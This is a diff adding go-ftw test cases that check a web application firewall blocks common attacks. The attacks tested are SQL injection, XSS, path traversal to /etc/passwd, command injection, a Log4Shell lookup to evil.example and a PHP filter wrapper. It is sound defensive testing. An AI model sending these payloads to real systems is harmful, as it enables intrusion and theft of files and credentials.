@@ -1,0 +1,129 @@
+---
+meta:
+  author: "gwaf"
+  description: >
+    Bundled go-ftw tests in the CRS format, run against gwaf's own ruleset.
+
+    They exist so the runner is verifiable without downloading the CRS corpus:
+    a harness nobody can execute is a harness nobody trusts. They are not a
+    substitute for the real corpus — these were written by the same people who
+    wrote the rules, which is exactly the bias the external suite exists to
+    remove. Point CRS_TESTS at the real thing for a result that means something.
+  enabled: true
+  name: "gwaf-injection"
+
+tests:
+  - test_title: "sqli-query-union"
+    desc: "UNION SELECT in a query parameter"
+    stages:
+      - description: "structural SQL injection is detected by grammar, not signature"
+        input:
+          method: "GET"
+          uri: "/products?id=1%20UNION%20SELECT%20password%20FROM%20users"
+          headers:
+            Host: "localhost"
+            User-Agent: "ftw"
+        output:
+          status: 403
+
+  - test_title: "sqli-query-tautology"
+    desc: "boolean tautology"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/products?id=1%27%20OR%201%3D1--"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_title: "sqli-body-json"
+    desc: "injection in a JSON body, not the query string"
+    stages:
+      - input:
+          method: "POST"
+          uri: "/api/order"
+          headers:
+            Host: "localhost"
+            Content-Type: "application/json"
+          data: '{"sku":"1'' OR ''1''=''1"}'
+        output:
+          status: 403
+
+  - test_title: "xss-script-tag"
+    desc: "reflected XSS"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_title: "xss-attribute-handler"
+    desc: "event handler in a tag, which position makes an attack"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_title: "traversal-etc-passwd"
+    desc: "path traversal to a sensitive file"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/download?file=../../../../etc/passwd"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_title: "traversal-double-encoded"
+    desc: "double percent-encoding; the origin decodes twice and so must the WAF"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/download?file=..%252f..%252f..%252fetc%252fpasswd"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_title: "rce-command-separator"
+    desc: "command injection after a shell separator"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/ping?host=localhost%3Bcat%20%2Fetc%2Fpasswd"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_title: "log4shell-user-agent"
+    desc: "JNDI lookup in a header, which is where it actually travels"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/"
+          headers:
+            Host: "localhost"
+            User-Agent: "${jndi:ldap://evil.example/a}"
+        output:
+          status: 403
+
+  - test_title: "php-wrapper"
+    desc: "PHP stream wrapper reaching the interpreter"
+    stages:
+      - input:
+          method: "GET"
+          uri: "/index.php?page=php://filter/convert.base64-encode/resource=config"
+          headers:
+            Host: "localhost"
+        output:
+          status: 403
